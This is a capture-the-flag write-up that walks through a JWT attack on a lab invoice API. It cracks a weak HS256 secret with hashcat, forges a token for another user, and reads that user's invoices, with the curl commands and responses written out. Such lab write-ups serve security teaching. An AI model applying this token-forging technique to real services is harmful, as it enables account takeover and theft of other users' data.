# Writeup

## Enumeration

I started by checking if the application was running using : Curl [http://localhost:5000/](http://IP:5000/) 
The Server returned a 404 which means the application might be API-only. 

Then i tried a few common API paths: 

curl [http://localhost:5000](http://IP:5000)/health →  {"status":"ok"}

Which confirms that the application was running and using a REST API structure. 
I tried `/api/` but got another 404 — no directory listing.

From the challenge name "InvoicePortal", I guessed that invoice-related endpoints might exist. Testing `/api/invoice` and  `/api/invoices` I found that  `/api/invoices`  returned a `401 Unauthorized`, not a 404. This told me:

- The endpoint exists
- It requires authentication

I tested other logical endpoints and got similar `401` responses:

- `/api/team/members`
- `/api/users/me`
- `/api/auth/login`

The distinction between 401 and 404 helped me confirm which endpoints were valid. 

## Authentication

 I logged in With the provided credentials: 

```bash
curl -X POST http://IP:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "attacker", "password": "attacker_pass123"}'
```

The response contained a JWT token:

```bash
{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjIsImVtYWlsIjoiYXR0YWNrZXJAbm9ydGh3aW5kLXRyYWRlcnMuZXhhbXBsZSIsImlhdCI6MTc4ODk3NDgxNywiZXhwIjoxNzg4OTc2NjE3fQ.cW9tqJfQQ7xI1S4epmspFBqcSkKBYVp66aywKm4KR24"
,"token_type":"Bearer"}
```

Decoding it using [jwt.io](http://jwt.io) 

```json
**Decoded Header
{
  "alg": "HS256",
  "typ": "JWT"
}
Decoded Payload
{
  "sub": 2,
  "email": "attacker@northwind-traders.example",
  "iat": 1788968701,
  "exp": 1788970501
}**
```

The token uses HS256, I researched this algorithm and found:

- **Symmetric Nature:** HS256 (HMAC-SHA256) uses the **exact same secret key** to both sign and verify tokens. Anyone who can verify a token can also forge a valid one.
- If the application uses a weak or default human-readable string as the HS256 secret key, attackers can run offline wordlists to **brute-force** the secret, then sign arbitrary payloads.

So I decided to test this hypothesis.

## **Cracking the JWT Secret**

To test the week secret hypothesis, I used **hashcat** With the provided wordlist. 

first i saved the JWT token to a file:

```bash
$ echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjIsImVtYWlsIjoiYXR0YWNrZXJAbm9ydGh3aW5kLXRyYWRlcnMuZXhhbXBsZSIsImlhdCI6MTc4ODk3NDgxNywiZXhwIjoxNzg4OTc2NjE3fQ.cW9tqJfQQ7xI1S4epmspFBqcSkKBYVp66aywKm4KR24' > jwt.token
```

hashcat cracked the secret: 

```bash
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjIsImVtYWlsIjoiYXR0YWNrZXJAbm9ydGh3aW5kLXRyYWRlcnMuZXhhbXBsZSIsImlhdCI6MTc4ODk3NDgxNywiZXhwIjoxNzg4OTc2NjE3fQ.cW9tqJfQQ7xI1S4epmspFBqcSkKBYVp66aywKm4KR24:changeme2024
```

## Finding Victim’s UserID

Now i had the JWT secret, I needed a target. So i used the `/api/team/members` with my token to list the team members: 

```bash
curl -X GET http://localhost:5000/api/team/members \
  -H "Authorization: Bearer <attacker_token>"

```

The response contained a list of users: 

```json
[
{"display_name":"Victim Vance (Accounting)","user_id":1},
{"display_name":"Alex Attacker (Support)","user_id":2}
]
```

This endpoint is a legitimate feature, It’s not a vulnerability by itself. However, it provided me with the user_id of another user in the company, which i could use in the next step. 

## Forging the JWT & Chaining the vulnerabilities

Forging the JWT: 

with the cracked secret (changeme2024) and the victim’s user_id= 1, i forged the new JWT using [jwt.io](http://jwt.io) 

I pasted the attacker token, modified it, and the secret used for signing <changme2024> : 

```json
{
  "sub": 1,
  "email": "victim@northwind-traders.example",
  "iat": 1788968701,
  "exp": 1788970501
}
```

      Note :

The JWT tokens have a 30-minute expiration time. When testing, you have to ensure the `iat` and `exp` timestamps were current. 

If the token expires, The server returns: 

```json
{"error":"invalid or expired token"}
```

Now i had a forged JWT as <victim>, I used it to access their invoices: 

```bash
curl -X GET http://localhost:5000/api/invoices \
  -H "Authorization: Bearer <forged_token>"
```

```json
[
{"amount_usd":199.0,
"company_name":"Northwind Traders",
"id":"e168adff-4c2c-4add-bc81-f5749c7046a7"},
{"amount_usd":1499.0,
"company_name":"Northwind Traders",
"id":"f1868b27-0810-4e5b-a861-5ca8e3c6c110"}
]
```

When I tried to access the invoices 

```bash
curl -X GET http://localhost:5000/api/invoices/6ba7b810-9dad-11d1-80b4-00c04fd430c8 \
  -H "Authorization: Bearer <forged_token>"
```

The response contained the flag: 

```json
{"amount_usd":1499.0,"card_last4":"9081",
"company_name":"Northwind Traders",
"id":"f1868b27-0810-4e5b-a861-5ca8e3c6c110",
"notes":"Annual enterprise renewal - internal audit note: duck{FLAG}",
"owner_id":1}
```